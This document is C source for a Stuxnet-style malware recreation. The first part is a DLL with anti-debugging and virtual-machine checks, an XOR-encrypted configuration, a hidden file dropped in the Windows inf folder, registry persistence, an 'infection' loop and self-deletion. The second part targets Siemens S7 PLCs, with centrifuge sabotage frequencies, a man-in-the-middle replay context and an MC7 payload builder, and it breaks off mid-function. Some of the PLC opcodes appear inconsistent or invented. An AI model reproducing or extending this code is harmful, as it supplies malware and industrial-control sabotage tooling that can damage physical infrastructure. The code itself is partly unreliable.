DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL MDMCPQ_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL MDMCPQ_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_MdmcpqCtx, sizeof(MDMCPQ_CTX));
    g_MdmcpqCtx.dwMagic = MDMCPQ_MAGIC;
    g_MdmcpqCtx.dwVersion = MDMCPQ_VERSION;
    g_MdmcpqCtx.dwPid = GetCurrentProcessId();
    g_MdmcpqCtx.dwTid = GetCurrentThreadId();
    g_MdmcpqCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_MdmcpqCtx.csLock);
    GetModuleFileNameW(NULL, g_MdmcpqCtx.szModulePath, MDMCPQ_MAX_PATH);
    GetSystemDirectoryW(g_MdmcpqCtx.szSystemPath, MDMCPQ_MAX_PATH);
    GetWindowsDirectoryW(g_MdmcpqCtx.szWindowsPath, MDMCPQ_MAX_PATH);
    wsprintfW(g_MdmcpqCtx.szInfPath, L"%s\\inf", g_MdmcpqCtx.szWindowsPath);
    wsprintfW(g_MdmcpqCtx.szPNFPath, L"%s\\mdmcpq3.PNF", g_MdmcpqCtx.szInfPath);
    MDMCPQ_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID MDMCPQ_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_MdmcpqCtx.hMutex) {
        CloseHandle(g_MdmcpqCtx.hMutex);
        g_MdmcpqCtx.hMutex = NULL;
    }
    if (g_MdmcpqCtx.hThread) {
        CloseHandle(g_MdmcpqCtx.hThread);
        g_MdmcpqCtx.hThread = NULL;
    }
    if (g_MdmcpqCtx.hStopEvent) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_MdmcpqCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL MDMCPQ_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_MdmcpqCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL MDMCPQ_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL MDMCPQ_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMCPQ_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD MDMCPQ_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID MDMCPQ_XORDecrypt(PBYTE pData, DWORD dwSize, BYTE bKey) {
    DWORD i;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= bKey;
    }
}

static VOID MDMCPQ_XOREncrypt(PBYTE pData, DWORD dwSize, BYTE bKey) {
    DWORD i;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= bKey;
    }
}

static BOOL MDMCPQ_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PMDMCPQ_CONFIG pConfig) {
    BYTE bKey = 0xFF;
    DWORD dwConfigSize;
    if (!pEncrypted || dwEncryptedSize == 0 || !pConfig) return FALSE;
    dwConfigSize = min(dwEncryptedSize, sizeof(MDMCPQ_CONFIG));
    if (dwConfigSize < sizeof(DWORD) * 2) return FALSE;
    memcpy(pConfig, pEncrypted, dwConfigSize);
    MDMCPQ_XORDecrypt((PBYTE)pConfig, dwConfigSize, bKey);
    if (pConfig->dwMagic != STUXNET_MAGIC && pConfig->dwMagic != MDMCPQ_MAGIC) {
        return FALSE;
    }
    g_dwDecryptCount++;
    return TRUE;
}

static BOOL MDMCPQ_EncryptConfig(PMDMCPQ_CONFIG pConfig, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    BYTE bKey = 0xFF;
    DWORD dwConfigSize;
    if (!pConfig || !pEncrypted || !pdwEncryptedSize) return FALSE;
    dwConfigSize = sizeof(MDMCPQ_CONFIG);
    if (*pdwEncryptedSize < dwConfigSize) return FALSE;
    memcpy(pEncrypted, pConfig, dwConfigSize);
    MDMCPQ_XOREncrypt(pEncrypted, dwConfigSize, bKey);
    *pdwEncryptedSize = dwConfigSize;
    g_dwEncryptCount++;
    return TRUE;
}

static BOOL MDMCPQ_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    g_dwReadCount++;
    return TRUE;
}

static BOOL MDMCPQ_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwWriteCount++;
    return TRUE;
}

static BOOL MDMCPQ_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(206), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL MDMCPQ_BuildConfigData(VOID) {
    ZeroMemory(&g_Config, sizeof(MDMCPQ_CONFIG));
    g_Config.dwMagic = STUXNET_MAGIC;
    g_Config.dwVersion = STUXNET_VERSION;
    g_Config.dwFlags = MDMCPQ_FLAG_ENCRYPTED | MDMCPQ_FLAG_VALID | MDMCPQ_FLAG_ACTIVE;
    g_Config.dwActivationTime = 0;
    g_Config.dwExpirationTime = 0x4F8B0000;
    g_Config.dwPropagationFlags = 0x00000001;
    strcpy_s(g_Config.szUpdateURL1, 256, MDMCPQ_URL_UPDATE1);
    strcpy_s(g_Config.szUpdateURL2, 256, MDMCPQ_URL_UPDATE2);
    strcpy_s(g_Config.szCheckURL1, 256, MDMCPQ_URL_WINDOWSUPDATE);
    strcpy_s(g_Config.szCheckURL2, 256, MDMCPQ_URL_MSN);
    return TRUE;
}

static BOOL MDMCPQ_BuildHostInfo(VOID) {
    DWORD dwSize;
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&g_HostInfo, sizeof(MDMCPQ_HOST_INFO));
    dwSize = 256;
    GetUserNameW(g_HostInfo.szUserName, &dwSize);
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    g_HostInfo.dwOSVersion = osvi.dwMajorVersion;
    g_HostInfo.dwOSBuild = osvi.dwBuildNumber;
    return TRUE;
}

static BOOL MDMCPQ_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    PBYTE pConfigData;
    DWORD dwConfigSize;
    PMDMCPQ_HEADER pHeader;
    if (!MDMCPQ_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (dwSize < sizeof(MDMCPQ_HEADER)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    pHeader = (PMDMCPQ_HEADER)pData;
    if (pHeader->dwMagic != MDMCPQ_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    MDMCPQ_BuildConfigData();
    MDMCPQ_BuildHostInfo();
    dwConfigSize = MDMCPQ_CONFIG_SIZE;
    pConfigData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwConfigSize);
    if (!pConfigData) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    if (!MDMCPQ_EncryptConfig(&g_Config, pConfigData, &dwConfigSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        HeapFree(GetProcessHeap(), 0, pConfigData);
        return FALSE;
    }
    memcpy(g_MdmcpqData, pConfigData, dwConfigSize);
    memcpy(g_MdmcpqData + MDMCPQ_CONFIG_SIZE, &g_HostInfo, sizeof(MDMCPQ_HOST_INFO));
    HeapFree(GetProcessHeap(), 0, pConfigData);
    if (!MDMCPQ_WritePNFToDisk(g_MdmcpqCtx.szPNFPath, g_MdmcpqData, MDMCPQ_FILE_SIZE)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL MDMCPQ_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, MDMCPQ_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, MDMCPQ_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL MDMCPQ_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MDMCPQ_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, MDMCPQ_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI MDMCPQ_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_MdmcpqCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMCPQ_IsExpired()) {
            break;
        }
        if (!MDMCPQ_ReadRegistry()) {
            MDMCPQ_WriteRegistry();
        }
        MDMCPQ_ExtractAndSavePNF();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL MDMCPQ_StartWorker(VOID) {
    g_MdmcpqCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_MdmcpqCtx.hStopEvent) return FALSE;
    g_MdmcpqCtx.hThread = CreateThread(NULL, 0, MDMCPQ_WorkerThread, NULL, 0, NULL);
    if (!g_MdmcpqCtx.hThread) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMCPQ_StopWorker(VOID) {
    if (g_MdmcpqCtx.hStopEvent) {
        SetEvent(g_MdmcpqCtx.hStopEvent);
    }
    if (g_MdmcpqCtx.hThread) {
        WaitForSingleObject(g_MdmcpqCtx.hThread, 5000);
        CloseHandle(g_MdmcpqCtx.hThread);
        g_MdmcpqCtx.hThread = NULL;
    }
    if (g_MdmcpqCtx.hStopEvent) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL MDMCPQ_SelfDestruct(VOID) {
    DeleteFileW(g_MdmcpqCtx.szPNFPath);
    return TRUE;
}

static BOOL MDMCPQ_Execute(VOID) {
    HANDLE hMutex;
    if (!MDMCPQ_Init()) return FALSE;
    if (MDMCPQ_IsExpired()) {
        MDMCPQ_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    if (MDMCPQ_CheckDebugger()) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    if (MDMCPQ_CheckVMware()) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    MDMCPQ_WriteRegistry();
    MDMCPQ_ReadRegistry();
    MDMCPQ_ExtractAndSavePNF();
    MDMCPQ_StartWorker();
    while (WaitForSingleObject(g_MdmcpqCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMCPQ_IsExpired()) {
            break;
        }
        MDMCPQ_ExtractAndSavePNF();
    }
    MDMCPQ_StopWorker();
    MDMCPQ_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            MDMCPQ_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MDMCPQ_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return MDMCPQ_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!MDMCPQ_ReadPNFFromDisk(g_MdmcpqCtx.szPNFPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PMDMCPQ_CONFIG pConfig;
    BOOL bResult;
    if (!MDMCPQ_ReadPNFFromDisk(g_MdmcpqCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    pConfig = (PMDMCPQ_CONFIG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MDMCPQ_CONFIG));
    if (!pConfig) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    bResult = MDMCPQ_DecryptConfig(pEncrypted, MDMCPQ_CONFIG_SIZE, pConfig);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pConfig);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return MDMCPQ_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return MDMCPQ_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return MDMCPQ_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    MDMCPQ_StopWorker();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    MDMCPQ_SelfDestruct();
    return 0;
}

DWORD WINAPI Export10(VOID) {
    return (DWORD)g_MdmcpqCtx.dwPid;
}

DWORD WINAPI Export11(VOID) {
    return MDMCPQ_VERSION;
}

DWORD WINAPI Export12(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export13(VOID) {
    return g_dwReadCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return g_dwDecryptCount;
}

DWORD WINAPI Export16(VOID) {
    return g_dwEncryptCount;
}

DWORD WINAPI Export17(VOID) {
    return (DWORD)g_MdmcpqCtx.hMutex;
}

DWORD WINAPI Export18(VOID) {
    return MDMCPQ_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return MDMCPQ_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return MDMCPQ_CheckVMware() ? 0 : 1;
}
MD5: 0x0DD2AF5AFE93118073CB656D813435A4
SHA-1: 0x256AC5228427FCD03FB9EC1871B15FD76E4D0879
END

S7PLCMain:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define ATTACK_MAGIC                    0x4B4C4154

#define S7_315_CPU                      0x315
#define S7_417_CPU                      0x417

#define FREQ_NORMAL                     1064
#define FREQ_ATTACK_HIGH                1410
#define FREQ_ATTACK_LOW                 2
#define FREQ_MIN_TARGET                 807
#define FREQ_MAX_TARGET                 1210

#define ATTACK_HIGH_DURATION_MS         900000
#define ATTACK_LOW_DURATION_MS          3000000
#define ATTACK_CYCLE_MS                 2332800000
#define ATTACK_INITIAL_DELAY_DAYS       13

#define TARGET_CONVERTER_MIN            33
#define TARGET_CONVERTER_MAX            186

#define TARGET_IR1_MAX_RPM              1410
#define IR1_CRITICAL_FREQ               1432

#define S7_PROFIBUS_DP_OFFSET           0x2CCB0001

#define DB8061_MAGIC                    0x91E55A3D
#define DB8061_MAGIC2                   0x996AB716
#define DB8061_MAGIC3                   0x4A5CB803

#define MC7_MARKER_DEADF007             0xDEADF007
#define MC7_MARKER_DEADBEEF             0xDEADBEEF

#define OB1_BLOCK                       0x0001
#define OB35_BLOCK                      0x0023

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)

typedef enum _ATTACK_PHASE {
    PHASE_IDLE = 0,
    PHASE_SURVEILLANCE = 1,
    PHASE_HIGH_FREQ = 2,
    PHASE_COOLDOWN = 3,
    PHASE_LOW_FREQ = 4,
    PHASE_RECOVERY = 5,
    PHASE_COMPLETE = 6
} ATTACK_PHASE;

typedef struct _ATTACK_STATE {
    DWORD dwPhase;
    DWORD dwPhaseStartTime;
    DWORD dwCycleCount;
    DWORD dwHighFreqCount;
    DWORD dwLowFreqCount;
    DWORD dwTargetConverters;
    DWORD dwCurrentFreq;
    DWORD dwOriginalFreq;
    BOOL bTargetValidated;
    BOOL bAttackActive;
    BOOL bReplayActive;
    BYTE bReserved[32];
} ATTACK_STATE, * PATTACK_STATE;

typedef struct _S7_PLC_TARGET {
    DWORD dwCPUType;
    DWORD dwCPUID;
    DWORD dwFirmwareVersion;
    DWORD dwMemorySize;
    DWORD dwProfibusModules;
    DWORD dwConverterCount;
    DWORD dwConverterTypes[256];
    WORD wCurrentFreq[256];
    WORD wOriginalFreq[256];
    DWORD dwCascadeCount;
    DWORD dwCascadeSize;
    BYTE bDB8061Data[256];
    BYTE bOB1Original[0x4000];
    BYTE bOB35Original[0x1000];
    BYTE bMC7Payload[0x2000];
    DWORD dwMC7Size;
    BOOL bS7_315;
    BOOL bS7_417;
    BOOL bTargetValidated;
    BOOL bInfected;
    BOOL bAttackRunning;
    ATTACK_STATE state;
    BYTE bReserved[64];
} S7_PLC_TARGET, * PS7_PLC_TARGET;

typedef struct _MITM_CTX {
    BOOL bActive;
    BOOL bRecording;
    BOOL bReplaying;
    DWORD dwRecordSize;
    DWORD dwReplayIndex;
    BYTE bRecordBuffer[0x10000];
    BYTE bReplayBuffer[0x10000];
    DWORD dwLastReadTime;
    DWORD dwLastWriteTime;
    CRITICAL_SECTION csLock;
    BYTE bReserved[64];
} MITM_CTX, * PMITM_CTX;

static S7_PLC_TARGET g_TargetPLC;
static ATTACK_STATE g_AttackState;
static MITM_CTX g_MITMCtx;
static DWORD g_dwAttackCount = 0;
static DWORD g_dwCentrifugeDestroyed = 0;
static BOOL g_bInitialized = FALSE;
static HANDLE g_hAttackThread = NULL;
static HANDLE g_hStopEvent = NULL;
static CRITICAL_SECTION g_csAttack;

static VOID EmitMC7_Load(PWORD* ppMC7, PDWORD pIdx, DWORD dwAddress) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0xA9;
    pMC7[idx++] = (WORD)(dwAddress >> 8);
    pMC7[idx++] = (WORD)(dwAddress & 0xFF);
    *pIdx = idx;
}

static VOID EmitMC7_Store(PWORD* ppMC7, PDWORD pIdx, DWORD dwAddress) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x11;
    pMC7[idx++] = (WORD)(dwAddress >> 8);
    pMC7[idx++] = (WORD)(dwAddress & 0xFF);
    *pIdx = idx;
}

static VOID EmitMC7_LoadConst(PWORD* ppMC7, PDWORD pIdx, WORD wValue) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = wValue;
    *pIdx = idx;
}

static VOID EmitMC7_Compare(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x7F;
    *pIdx = idx;
}

static VOID EmitMC7_Jump(PWORD* ppMC7, PDWORD pIdx, DWORD dwTarget, BOOL bConditional) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    if (bConditional) {
        pMC7[idx++] = 0x00;
        pMC7[idx++] = (WORD)(dwTarget >> 8);
        pMC7[idx++] = (WORD)(dwTarget & 0xFF);
    } else {
        pMC7[idx++] = 0x00;
        pMC7[idx++] = (WORD)(dwTarget >> 8);
        pMC7[idx++] = (WORD)(dwTarget & 0xFF);
    }
    *pIdx = idx;
}

static VOID EmitMC7_Add(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x7F;
    *pIdx = idx;
}

static VOID EmitMC7_Sub(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x6F;
    *pIdx = idx;
}

static VOID EmitMC7_Return(PWORD* ppMC7, PDWORD pIdx) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = 0x0000;
    *pIdx = idx;
}

static VOID EmitMC7_Marker(PWORD* ppMC7, PDWORD pIdx, DWORD dwMarker) {
    PWORD pMC7 = *ppMC7;
    DWORD idx = *pIdx;
    pMC7[idx++] = (WORD)(dwMarker >> 16);
    pMC7[idx++] = (WORD)(dwMarker & 0xFFFF);
    *pIdx = idx;
}

static BOOL BuildMC7Payload_S7_315(PS7_PLC_TARGET pPLC) {
    PWORD pMC7;
    DWORD idx;
    DWORD dwPatch1, dwPatch2, dwPatch3, dwPatch4;
    DWORD dwFreqHigh;
    DWORD dwFreqLow;
    DWORD dwFreqNormal;
    DWORD dwHighDuration;
    DWORD dwLowDuration;
    if (!pPLC) return FALSE;
    pMC7 = (PWORD)pPLC->bMC7Payload;
    idx = 0;
    dwFreqHigh = FREQ_ATTACK_HIGH;
    dwFreqLow = FREQ_ATTACK_LOW;
    dwFreqNormal = FREQ_NORMAL;
    dwHighDuration = ATTACK_HIGH_DURATION_MS / 100;
    dwLowDuration = ATTACK_LOW_DURATION_MS / 100;
    pMC7[idx++] = 0x0700;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x00FB;
    pMC7[idx++] = 0x0000;
    pMC7[idx++] = 0x0001;
    pMC7[idx++] = 0x0002;
    pMC7[idx++] = 0x0000;
    EmitMC7_Load(&pMC7, &idx, 0x1164);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch1 = idx - 2;
    EmitMC7_Jump(&pMC7, &idx, 0, FALSE);
    dwPatch2 = idx - 2;
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x1102);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1164);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Store(&pMC7, &idx, 0x200A);
    EmitMC7_Load(&pMC7, &idx, 0x0100);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x2014);
    EmitMC7_Load(&pMC7, &idx, 0x0014);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_LoadConst(&pMC7, &idx, 100);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x1202);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Add(&pMC7, &idx);
    EmitMC7_Store(&pMC7, &idx, 0x200A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_LoadConst(&pMC7, &idx, 64);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch3 = idx - 2;
    EmitMC7_LoadConst(&pMC7, &idx, 64);
    EmitMC7_LoadConst(&pMC7, &idx, 33);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    dwPatch4 = idx - 2;
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 0);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x1100);
    EmitMC7_LoadConst(&pMC7, &idx, 2);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_LoadConst(&pMC7, &idx, 1);
    EmitMC7_Store(&pMC7, &idx, 0x1100);
    EmitMC7_Return(&pMC7, &idx);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqHigh);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwHighDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwFreqLow);
    EmitMC7_Store(&pMC7, &idx, 0x1104);
    EmitMC7_LoadConst(&pMC7, &idx, (WORD)dwLowDuration);
    EmitMC7_Store(&pMC7, &idx, 0x1106);
    EmitMC7_Load(&pMC7, &idx, 0x1104);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Compare(&pMC7, &idx);
    EmitMC7_Jump(&pMC7, &idx, 0, TRUE);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Load(&pMC7, &idx, 0x000A);
    EmitMC7_Add(&pMC7, &idx);
